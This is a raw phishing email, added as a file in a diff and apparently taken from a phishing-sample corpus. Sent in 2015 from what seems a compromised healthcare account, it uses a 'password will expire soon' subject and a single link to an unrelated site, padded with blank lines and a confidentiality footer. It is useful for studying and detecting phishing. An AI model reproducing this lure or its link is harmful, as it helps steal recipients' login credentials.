@@ -1,0 +1,262 @@
+Return-Path: <duchetla@cmhc.org>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id C84B5F41F6
+	for <jose@login.monkey.org>; Thu, 29 Oct 2015 08:41:10 -0500 (CDT)
+Received: from smtpin18.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay03.b.hostedemail.com (Postfix) with SMTP id 0BA651847DD
+	for <jose@login.monkey.org>; Thu, 29 Oct 2015 13:41:10 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 70795256700.18.tail83_a14d17f65060
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 50,2,0,b3a2d1d8a9ed9956,d41d8cd98f00b204,duchetla@cmhc.org,,RULES_HIT:2:10:41:72:355:379:474:960:962:967:973:978:983:988:989:1189:1208:1221:1260:1261:1263:1313:1314:1345:1381:1431:1436:1437:1516:1517:1518:1535:1575:1588:1589:1592:1594:1606:1730:1777:1792:2196:2199:2380:2525:2527:2528:2553:2561:2564:2610:2682:2685:2737:2859:2892:2895:2913:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3352:3586:3635:3770:3865:3866:3867:3868:3870:3871:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4120:4321:4552:4860:5007:6117:6238:6261:6658:6703:7602:7903:8512:8513:8518:8603:8660:8957:9025:9080:9149:9388:9390:9411:9512:9855:10004:10216:10346:10920:11245:11656:11658:11875:11914:12043:12291:12331:12438:12517:12519:12555:12683:13005:13017:13018:13019:13139:13148:13230:13237:13893:14096:14110:14158,0,RBL:neutral,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fp,MSBL:0,DNSBL:cmhc.org-dnsbl7.mailshell.net-127.0.0.120,Custom_rules
+X-HE-Tag: tail83_a14d17f65060
+X-Filterd-Recvd-Size: 9720
+Received: from cmh-imsva1.cmhc.org (mx1.cmhc.org [206.208.205.21])
+	by imf23.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Thu, 29 Oct 2015 13:41:09 +0000 (UTC)
+Received: from cmh-imsva1.cmhc.org (unknown [127.0.0.1])
+	by IMSVA (Postfix) with ESMTP id 74579B59E4
+	for <jose@monkey.org>; Thu, 29 Oct 2015 09:41:08 -0400 (EDT)
+Received: from cmh-zix01.cmhc.org (unknown [10.232.4.104])
+	by cmh-imsva1.cmhc.org (Postfix) with ESMTPS id 2A9A1B5A12
+	for <jose@monkey.org>; Thu, 29 Oct 2015 09:41:08 -0400 (EDT)
+Received: from 127.0.0.1 (ZixVPM [127.0.0.1])
+	by Outbound.cmhc.org (Proprietary) with SMTP id 7D53A123FFB
+	for <jose@monkey.org>; Thu, 29 Oct 2015 09:12:13 -0400 (EDT)
+Received: from CMH-EXCH-CAS04.cmhc.org (cmh-exch-cas04.cmhc.org [10.232.4.123])
+	(using TLSv1 with cipher AES128-SHA (128/128 bits))
+	(No client certificate requested)
+	by cmh-zix01.cmhc.org (Proprietary) with ESMTPS id A18D8121914;
+	Thu, 29 Oct 2015 09:12:05 -0400 (EDT)
+Received: from CMH-EXCH01.cmhc.org ([fe80::2473:9d30:7e6:2c9e]) by
+ CMH-EXCH-CAS04.cmhc.org ([::1]) with mapi; Thu, 29 Oct 2015 09:12:03 -0400
+From: Laura Duchette <DuchetLa@cmhc.org>
+Date: Thu, 29 Oct 2015 09:12:02 -0400
+Subject: Your password will expire soon
+Thread-Topic: Your password will expire soon
+Thread-Index: AQHREktmZAC4o1cpAkmYKCZReePA+g==
+Message-ID: <01F0778E0B6E984DAAD77B1CBC3EE58B04ABEB83FC72@CMH-EXCH01.cmhc.org>
+Accept-Language: en-US
+Content-Language: en-US
+X-MS-Has-Attach:
+X-MS-TNEF-Correlator:
+acceptlanguage: en-US
+X-TM-AS-Product-Ver: IMSVA-9.0.0.1510-8.0.0.1202-21908.007
+X-TM-AS-Result: No--9.282-5.0-31-10
+X-TM-AS-User-Approved-Sender: No
+X-TM-AS-User-Blocked-Sender: No
+Content-Type: multipart/alternative;
+	boundary="_000_01F0778E0B6E984DAAD77B1CBC3EE58B04ABEB83FC72CMHEXCH01cm_"
+MIME-Version: 1.0
+X-VPM-HOST: cmh-zix01.cmhc.org
+X-VPM-GROUP-ID: 65adfb0b-1c06-406d-bc4b-d1b3aac177d6
+X-VPM-MSG-ID: 59ea4944-d385-4f6d-8c61-ffc00041d046
+X-VPM-ENC-REGIME: Plaintext
+X-VPM-IS-HYBRID: 0
+To: undisclosed-recipients:;
+X-TM-AS-GCONF: 00
+X-imss-scan-details: No--9.282-5.0-31-10;No--9.282-4.5-31-10
+X-TM-AS-Result-Xfilter: Match text exemption rules:No
+X-TMASE-Version: IMSVA-9.0.0.1510-8.0.1202-21908.007
+X-TMASE-Result: 10--9.282200-5.000000
+X-TMASE-MatchedRID: zRq+SEqfCYpB8Lm1GY7AGjm9y1RX1yxq9BqOz9jC6amaoxXA3s7WcdqC
+	xkzSpW/XX47th4T5R3rwhm8Bh/xYwHnNmEwh4s/OBWd9rvGh7KwSuhBXNJb1dAFjA7j2afowZqT
+	7LuN3BFEf/E2LwC06ADHjsALEcqSe43jtNmWGMi1/8ExVpAyigddTa+G9pdRBOhJ9m53n4aCzXL
+	gm/AgMbl7PcYMCvFwdc8GFupMHu6KdCvV59y5+Qoc7+Qb8+03pG66tuBin4dD8BlbXy+O/WuKYp
+	wtG+wHV/kMJBWzni8J2+AZuxakJyz5yNRGdBvJsU3mQhmdh4RgMH4SsGvRsA8ogYxpm9PTbDpgn
+	w3KggpqLR9knQVsb8sOlGITHShYm2VoX2mvb7ITfW6mMWTtZdOQYBHVKqgDUxJJi84FNinqbKIt
+	l61J/yZUdXE/WGn0F+qVD1+oFOAkCcKvl37mIuNxFyxWUZB4n+gtHj7OwNO0IvPdC2hUq0d1rW6
+	gmEqkVBoar6C7K4wVU3dlYrg8Lx+hYQzIIU1ea1imtVnnmx5nSsvB8SFBeY76WizBF8ZM0X1BbC
+	Z7IJb543MJyVDuEyQ==
+X-TMASE-SNAP-Result: 1.801202.0001-0-1-22:0,12:0
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 223
+
+--_000_01F0778E0B6E984DAAD77B1CBC3EE58B04ABEB83FC72CMHEXCH01cm_
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+Click here to proceed with your Email update.<http://pensacolasola.com/logs=
+/>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+________________________________
+This message and any included attachments are from Central Maine Healthcare=
+ and are intended only for the addressee. The information contained in this=
+ message is confidential and may constitute inside or non-public informatio=
+n under international, federal, or state securities laws. Unauthorized forw=
+arding, printing, copying, distribution, or use of such information is stri=
+ctly prohibited and may be unlawful. If you are not the addressee, please p=
+romptly delete this message and notify the sender of the delivery error by =
+E-mail or you may call Central Maine Healthcare in Lewiston, Maine, U.S.A a=
+t (207) 795-2259. Thank you.
+
+--_000_01F0778E0B6E984DAAD77B1CBC3EE58B04ABEB83FC72CMHEXCH01cm_
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<html dir=3D"ltr">
+<head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859-=
+1">
+<style id=3D"owaTempEditStyle"></style><style title=3D"owaParaStyle"><!--P =
+{
+	MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px
+}
+--></style>
+</head>
+<body ocsi=3D"x">
+<div style=3D"FONT-FAMILY: Tahoma; DIRECTION: ltr; COLOR: #000000; FONT-SIZ=
+E: small">
+<div></div>
+<div dir=3D"ltr"><font color=3D"#000000" size=3D"3" face=3D"Tahoma"></font>=
+&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px"><a href=3D"http://pensa=
+colasola.com/logs/" target=3D"_blank"><strong><font size=3D"4">Click here t=
+o proceed with your Email update.</font></strong></a></div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px">&nbsp;</div>
+<div style=3D"FONT-FAMILY: Tahoma; FONT-SIZE: 13px"></div>
+</div>
+<br>
+<hr>
+<font face=3D"Arial" color=3D"Gray" size=3D"1">This message and any include=
+d attachments are from Central Maine Healthcare and are intended only for t=
+he addressee. The information contained in this message is confidential and=
+ may constitute inside or non-public information
+ under international, federal, or state securities laws. Unauthorized forwa=
+rding, printing, copying, distribution, or use of such information is stric=
+tly prohibited and may be unlawful. If you are not the addressee, please pr=
+omptly delete this message and notify
+ the sender of the delivery error by E-mail or you may call Central Maine H=
+ealthcare in Lewiston, Maine, U.S.A at (207) 795-2259. Thank you.<br>
+</font>
+</body>
+</html>
+
+--_000_01F0778E0B6E984DAAD77B1CBC3EE58B04ABEB83FC72CMHEXCH01cm_--
